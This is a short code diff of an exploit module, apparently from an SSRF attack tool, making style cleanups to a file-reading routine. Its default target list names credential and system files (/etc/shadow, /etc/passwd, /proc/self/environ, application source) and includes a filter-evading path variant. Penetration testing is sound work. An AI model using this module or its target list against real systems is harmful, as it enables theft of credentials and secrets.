@@ -9,14 +9,14 @@ author        = "Swissky"
 documentation = []
 
 class exploit():
-    
+
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
-        self.files = args.targetfiles.split(',') if args.targetfiles != None else ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]   
-        
+        self.files = args.targetfiles or ["/etc/passwd", "/etc/lsb-release", "/etc/shadow", "/etc/hosts", "\/\/etc/passwd", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/cwd/index.php", "/proc/self/cwd/application.py", "/proc/self/cwd/main.py", "/proc/self/exe"]
+
         r = requester.do_request(args.param, "")
-        
-        if r != None:
+
+        if r is not None:
             default = r.text
 
             # Create directory to store files
